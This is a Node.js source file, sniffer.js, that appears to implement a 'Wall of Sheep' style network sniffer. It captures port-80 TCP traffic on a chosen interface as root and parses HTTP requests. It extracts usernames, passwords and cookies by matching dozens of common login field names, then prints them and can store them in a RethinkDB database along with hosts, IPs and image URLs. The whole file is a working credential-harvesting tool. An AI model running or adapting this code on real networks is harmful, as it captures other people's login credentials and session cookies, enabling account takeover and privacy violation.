/*File:           sniffer.js */
/*Author:         magerx@paxmac.org*/
/*Last modified:  2017/07/05*/

var qs = require('querystring');
var protocol = require('./ports_table');
var pcap = require('pcap');
var argv = require('minimist')(process.argv.slice(2));
var request = require('request');

if (argv.s) {
    var User = require('./models/user');
    console.log('[-] Loading RethinkDB module.');
}

function GetHTTPLoginAccount(data) {
    var account = null;

    var userFields = [
        'log', 'login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user',
        'user_name', 'alias', 'pseudo', 'email', 'username', '_username', 'userid',
        'form_loginname', 'loginname', 'login_id', 'loginid', 'session_key',
        'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename', 'uname',
        'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername',
        'login_username', 'login_email', 'loginusername', 'loginemail', 'uin',
        'sign-in', 'identification', 'os_username', 'txtaccount', 'loginaccount'
    ];

    var keys = Object.keys(data);
    var arrayLength = keys.length;
    for (var i = 0; i < arrayLength; i++) {
        if (userFields.indexOf(keys[i].toLowerCase()) !== -1) {
            account = data[keys[i]];
        }
    }
    return account;
}

function GetHTTPLoginPassword(data) {
    var password = null;

    var passFields = [
        'os_password', 'txtPwd', 'loginPasswd', 'ahd_password', 'pass', 'password',
        '_password', 'passwd', 'passwrd', 'session_password', 'sessionpassword',
        'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd',
        'upassword', 'login_password', 'passwort', 'wppassword', 'upasswd'
    ];

    var keys = Object.keys(data);
    var arrayLength = keys.length;
    for (var i = 0; i < arrayLength; i++) {
        if (passFields.indexOf(keys[i].toLowerCase()) !== -1) {
            password = data[keys[i]];
        }
    }
    return password;
}

function HTTPDataParser(packet) {
    var linkLayer = packet.payload;
    var networkLayer = packet.payload.payload;
    var tranportLayer = packet.payload.payload.payload;

    var data = tranportLayer.data.toString('ascii');

    // Source MAC address
    var shost = linkLayer.shost.toString('ascii');

    // Source IP address
    var saddr = networkLayer.saddr.toString('ascii');

    // Dst IP address
    var daddr = networkLayer.daddr.toString('ascii');

    // Source port
    var sport = tranportLayer.sport;

    // Dst port
    var dport = tranportLayer.dport;

    var isPOST = data.indexOf('POST');
    var isGET = data.indexOf('GET');

    if (isPOST === 0 || isGET === 0) {
        var headerContent = data.split('\r\n');

        // get cookie
        var cookies = null;
        var picture = null;

        for (var header in headerContent) {
            if (headerContent[header].indexOf('Cookie:') === 0) {
                cookies = headerContent[header].split(': ')[1];
            }
            else if (headerContent[header].indexOf('Host:') === 0) {
                var domain = headerContent[header].split(': ')[1];
            }
        }
        // returns the last element (querystring) and removes it from the array
        if (isPOST === 0) {
            var Content = headerContent.pop();
        }

        else {
            // get querystring for get method
            var uri = headerContent[0].split(' ')[1];
            Content = uri.split('?')[1];

            var pattern = new RegExp("\.(jpg|png|gif|jpeg|bmp)$");

            if (pattern.test(uri.split('?')[0].toLowerCase())) {
                picture = 'http://' + domain + uri;
                request.head(picture, function (error, response) {
                    if (!error && response.statusCode === 200) {
                        var picture = picture;
                    }
                    else {
                        picture = null;
                    }
                })
            }

        }

        var sheepInfo = qs.parse(Content);

        // For DEGUG print
        // console.log(utf8.decode(sheepInfo));

        var account = GetHTTPLoginAccount(sheepInfo);
        var password = GetHTTPLoginPassword(sheepInfo);

        ConsolePrinter(shost, saddr, daddr, sport, dport, account, password, cookies, domain);
        var obj = {};

        obj.shost = shost;
        obj.srcIP = saddr;
        obj.dstIP = daddr;
        obj.sport = sport;
        obj.dport = dport;
        obj.user = account;
        obj.pass = password;
        obj.cookies = cookies;
        obj.domain = domain;
        obj.picture = picture;

        return obj;
    }
}

function ConsolePrinter(shost, srcIP, dstIP, sport, dport, account, password, cookies, domain) {
    if (account !== null) {
        console.log('[[%s]%s:%d -> %s:%d] %s Account: %s', shost, srcIP, sport, dstIP, dport, protocol[dport], account, cookies, domain);
    }

    if (password !== null) {
        console.log('[%s:%d -> %s:%d] %s Password: %s', shost, srcIP, sport, dstIP, dport, protocol[dport], password, cookies, domain);
    }
}

function SavetoRethinkDB(beSaved) {
    // If HTTPDataParser can not get cookie and password given null do not save
    if (beSaved.cookies === null && beSaved.pass === null && beSaved.picture === null) {
        return;
    }

    var userinfo = new User({
        timestamp: Date.now().toString(),
        shost: beSaved.shost,
        sIP: beSaved.srcIP,
        dIP: beSaved.dstIP,
        sPort: beSaved.sport,
        dPort: beSaved.dport,
        protocol: protocol[beSaved.dport],
        login: beSaved.user || null,
        password: beSaved.pass || null,
        cookies: beSaved.cookies,
        domain: beSaved.domain,
        picture: beSaved.picture
    });

    // if account and password are not null then save it.
    if (userinfo.cookies !== null || userinfo.password !== null || userinfo.picture !== null) {
        userinfo.save().then(function () {
            console.log('[-] Save to RethinkDB or not: %s', userinfo.isSaved());
            console.log('[-] Data id: %s', userinfo.id);
            console.log(userinfo);
        });
    }
}

function WelcomeMessage() {
    console.log('  _       _____    __    __       ____  ______   _____ __  __________________');
    console.log('| |     / /   |  / /   / /      / __ \\/ ____/  / ___// / / / ____/ ____/ __ \\');
    console.log('| | /| / / /| | / /   / /      / / / / /_      \\__ \\/ /_/ / __/ / __/ / /_/ /');
    console.log('| |/ |/ / ___ |/ /___/ /___   / /_/ / __/     ___/ / __  / /___/ /___/ ____/ ');
    console.log('|__/|__/_/  |_/_____/_____/   \\____/_/       /____/_/ /_/_____/_____/_/      ');
}

function StartCapture() {

    WelcomeMessage();

    if (process.getuid() !== 0) {
        console.log('[*] Please run as root');
        process.exit(1);
    }

    if (!argv.i) {
        console.log('[*] Specify an interface for capturing.');
        process.exit(1);
    }
    else {
        var pcapSession = pcap.createSession(argv.i, 'ip proto \\tcp');

        console.log('[*] Using interface: %s', pcapSession.device_name);

        pcapSession.on('packet', function (rawPacket) {

            var packet = pcap.decode.packet(rawPacket);
            var tranportLayer = packet.payload.payload.payload;
            var isHTTP = tranportLayer.dport === 80 && tranportLayer.data !== null;

            // For all protocols we interested and also data not null
            if (isHTTP) {
                var HTTPInfoObj = new HTTPDataParser(packet);
                if (argv.s && HTTPInfoObj) {
                    SavetoRethinkDB(HTTPInfoObj);
                }
            }
        });
    }
}

StartCapture();